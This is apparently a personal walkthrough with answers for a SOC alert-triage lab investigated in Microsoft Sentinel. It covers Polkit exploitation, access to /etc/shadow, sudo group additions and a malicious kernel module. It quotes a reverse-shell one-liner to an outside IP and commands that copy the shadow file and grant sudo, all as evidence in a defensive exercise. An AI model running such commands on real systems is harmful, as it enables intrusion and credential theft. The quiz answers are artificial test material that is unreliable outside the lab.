# SOC Alert Triaging - Tinsel Triage

**Process Triage:** In a high-volume alert environment, we must distinguish between "noise" and genuine threats. By correlating process events, entity behavior, and system logs within Microsoft Sentinel, we can reconstruct the attack lifecycle—from initial access to persistence.

- **Alert Indicators:** `Polkit exploit`, `Sudo Shadow Access`, `User added to sudo group`, `Kernel module insertion`.
    
- **Command‑line traits:** `/bin/bash -i` (Reverse Shell), `cp` targeting `/etc/shadow`, `insmod` for `.ko` files, `usermod -aG sudo`.
    
- **Infrastructure & Entities:** Azure Sentinel Incidents, `Syslog_CL` table, KQL queries, and specific host identifiers like `app-01` and `websrv-01`.
    
## Solve:

1. To investigate the scope of the Polkit exploit, I accessed the Sentinel Incident dashboard to identify how many unique assets were targeted.
    - **How many entities are affected by the Linux PrivEsc - Polkit Exploit Attempt alert?**
	    - Answer: `10`
    - **What is the severity of the Linux PrivEsc - Sudo Shadow Access alert?**
	    - Answer: `High`

2. To identify unauthorized privilege escalation, I analyzed the "User Added to Sudo Group" alert and cross-referenced it with host logs to find hidden administrative changes.
    - **How many accounts were added to the sudoers group?**
        - Answer: `4`
    - **Aside from the backup user, what is the name of the user added to the sudoers group inside app-01?**
	    - Answer: `deploy`
        
3. To uncover persistence and active backdoors, I used KQL (Kusto Query Language) to filter raw syslog data for suspicious binary executions and external connections.
    
    - **What is the name of the kernel module installed in websrv-01?**
	    - Answer: `malicious_mod.ko    
    - **What is the unusual command executed within websrv-01 by the ops user?**
	    - Command: `/bin/bash -i >& /dev/tcp/198.51.100.22/4444 0>&1`
    - **What is the source IP address of the first successful SSH login to storage-01?** 
	    - Answer: 172.16.0.12
    - **What is the external source IP that successfully logged in as root to app-01?**
        - Answer: `203.0.113.45`
	- **Aside from the backup user, what is the name of the user added to the sudoers group inside app-01?**
		- Answer : deploy